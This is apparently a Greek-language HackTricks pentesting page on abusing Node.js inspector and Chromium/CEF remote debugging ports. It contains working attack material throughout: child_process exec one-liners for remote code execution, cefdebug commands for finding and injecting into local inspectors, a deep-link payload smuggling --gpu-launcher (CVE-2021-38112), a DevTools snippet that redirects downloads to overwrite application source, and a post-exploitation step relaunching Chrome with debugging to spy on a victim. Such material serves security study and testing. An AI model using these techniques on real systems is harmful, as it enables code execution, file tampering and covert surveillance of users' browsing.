# Κατάχρηση Node inspector/CEF debug

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

[Από την τεκμηρίωση](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Όταν εκκινείται με το switch `--inspect`, μια διεργασία Node.js ακούει για έναν debugging client. Από **προεπιλογή**, ακούει στη διεύθυνση host και port **`127.0.0.1:9229`**. Σε κάθε διεργασία εκχωρείται επίσης ένα **μοναδικό** **UUID**.

Οι inspector clients πρέπει να γνωρίζουν και να καθορίζουν τη διεύθυνση host, το port και το UUID για να συνδεθούν. Ένα πλήρες URL θα μοιάζει κάπως έτσι: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Εφόσον ο **debugger έχει πλήρη πρόσβαση στο περιβάλλον εκτέλεσης του Node.js**, ένας κακόβουλος παράγοντας που μπορεί να συνδεθεί σε αυτό το port ενδέχεται να είναι σε θέση να εκτελέσει αυθαίρετο code εκ μέρους της διεργασίας Node.js (**potential privilege escalation**).

Υπάρχουν διάφοροι τρόποι για την εκκίνηση ενός inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Όταν ξεκινάτε μια inspected process, θα εμφανιστεί κάτι σαν το εξής:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Οι διεργασίες που βασίζονται στο **CEF** (**Chromium Embedded Framework**) χρειάζεται να χρησιμοποιούν την παράμετρο: `--remote-debugging-port=9222` για να ανοίξουν το **debugger** (οι προστασίες SSRF παραμένουν παρόμοιες). Ωστόσο, αντί να παρέχουν μια **NodeJS** συνεδρία **debug**, επικοινωνούν με τον browser χρησιμοποιώντας το [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), το οποίο είναι ένα interface για τον έλεγχο του browser, αλλά δεν υπάρχει άμεσο RCE.

Όταν ξεκινάτε έναν browser με ενεργοποιημένο debug, θα εμφανιστεί κάτι σαν το εξής:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets και same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Οι ιστότοποι που ανοίγουν σε ένα web-browser μπορούν να πραγματοποιούν WebSocket και HTTP requests σύμφωνα με το μοντέλο ασφάλειας του browser. Απαιτείται μια **initial HTTP connection** για την **απόκτηση ενός μοναδικού debugger session id**. Το **same-origin-policy** **εμποδίζει** τους ιστότοπους να πραγματοποιήσουν **αυτήν την HTTP connection**. Για πρόσθετη ασφάλεια έναντι [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** το Node.js επαληθεύει ότι τα **'Host' headers** της connection είτε καθορίζουν μια **IP address** είτε ακριβώς το **`localhost`** ή το **`localhost6`**.

> [!TIP]
> Αυτό το **security measure εμποδίζει την εκμετάλλευση του inspector** για την εκτέλεση κώδικα με **απλή αποστολή ενός HTTP request** (κάτι που θα μπορούσε να γίνει με την εκμετάλλευση ενός SSRF vuln).

### Εκκίνηση του inspector σε running processes

Μπορείτε να στείλετε το **signal SIGUSR1** σε ένα running nodejs process, ώστε να **ξεκινήσει το inspector** στο default port. Ωστόσο, σημειώστε ότι χρειάζεστε επαρκή privileges, επομένως αυτό μπορεί να σας παρέχει **privileged access σε πληροφορίες μέσα στο process**, αλλά όχι άμεσο privilege escalation.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Αυτό είναι χρήσιμο σε containers, επειδή το **τερματισμός της διεργασίας και η εκκίνηση μιας νέας** με `--inspect` **δεν αποτελεί επιλογή**, καθώς το **container** θα **τερματιστεί** μαζί με τη διεργασία.

### Σύνδεση στο inspector/debugger

Για σύνδεση σε έναν **Chromium-based browser**, είναι δυνατή η πρόσβαση στα URLs `chrome://inspect` ή `edge://inspect` για Chrome ή Edge, αντίστοιχα. Κάνοντας κλικ στο κουμπί Configure, θα πρέπει να διασφαλίζεται ότι ο **target host και η θύρα** εμφανίζονται σωστά. Η εικόνα δείχνει ένα παράδειγμα Remote Code Execution (RCE):

![Μετά την εμφάνιση ενός URL για πρόσβαση στον debugger, π.χ. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Σύνδεση στο inspector/debugger: Για σύνδεση σε έναν Chromium-based browser,...](<../../images/image (674).png>)

Χρησιμοποιώντας τη **γραμμή εντολών**, μπορείτε να συνδεθείτε σε έναν debugger/inspector με:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Το εργαλείο [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) επιτρέπει να **εντοπίζει inspectors** που εκτελούνται τοπικά και να **inject code** σε αυτούς.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Σημειώστε ότι τα exploits για **RCE** σε **NodeJS** δεν θα λειτουργήσουν αν συνδεθείτε σε έναν browser μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (πρέπει να ελέγξετε το API για να βρείτε ενδιαφέρουσες δυνατότητες που μπορείτε να αξιοποιήσετε).

## RCE σε NodeJS Debugger/Inspector

> [!TIP]
> Αν επισκεφθήκατε αυτήν τη σελίδα για να δείτε πώς να αποκτήσετε [**RCE από ένα XSS στο Electron, δείτε αυτήν τη σελίδα.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Μερικοί συνηθισμένοι τρόποι για την απόκτηση **RCE**, όταν μπορείτε να **συνδεθείτε** σε έναν **inspector** του Node, είναι η χρήση κάτι όπως το παρακάτω (φαίνεται ότι αυτό **δεν θα λειτουργήσει σε σύνδεση με το Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Μπορείτε να ελέγξετε το API εδώ: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Σε αυτή την ενότητα θα παραθέσω απλώς ενδιαφέροντα πράγματα που έχω βρει να χρησιμοποιούν άτομα για να εκμεταλλευτούν αυτό το protocol.

### Parameter Injection via Deep Links

Στο [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) η Rhino security ανακάλυψε ότι μια εφαρμογή βασισμένη στο CEF **καταχώρισε ένα custom UR**I στο σύστημα (workspaces://index.html), το οποίο λάμβανε ολόκληρο το URI και στη συνέχεια **εκκινούσε την εφαρμογή που βασιζόταν στο CEF**n με μια διαμόρφωση που κατασκευαζόταν εν μέρει από αυτό το URI.

Ανακαλύφθηκε ότι οι παράμετροι του URI γίνονταν URL decoded και χρησιμοποιούνταν για την εκκίνηση της βασικής εφαρμογής CEF, επιτρέποντας σε έναν χρήστη να **εισάγει** το flag **`--gpu-launcher`** στη **command line** και να εκτελέσει αυθαίρετες ενέργειες.

Έτσι, ένα payload όπως:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Θα εκτελέσει ένα calc.exe.

### Αντικατάσταση αρχείων

Αλλάξτε τον φάκελο όπου θα αποθηκεύονται τα **ληφθέντα αρχεία** και κατεβάστε ένα αρχείο για να **αντικαταστήσετε** τον συχνά χρησιμοποιούμενο **source code** της εφαρμογής με τον **κακόβουλο code** σας.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE και exfiltration

Σύμφωνα με αυτήν την ανάρτηση: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), είναι δυνατή η απόκτηση RCE και η exfiltration εσωτερικών σελίδων από το theriver.

### Post-Exploitation

Σε ένα πραγματικό περιβάλλον και **μετά το compromising** ενός user PC που χρησιμοποιεί browser βασισμένο σε Chrome/Chromium, θα μπορούσατε να εκκινήσετε μια διεργασία Chrome με το **debugging ενεργοποιημένο και να κάνετε port-forward τη θύρα debugging**, ώστε να έχετε πρόσβαση σε αυτήν. Με αυτόν τον τρόπο θα μπορείτε να **επιθεωρείτε όλα όσα κάνει το θύμα με το Chrome και να κλέβετε ευαίσθητες πληροφορίες**.

Ο stealth τρόπος είναι να **τερματίσετε κάθε διεργασία Chrome** και έπειτα να καλέσετε κάτι όπως
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Αναφορές

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
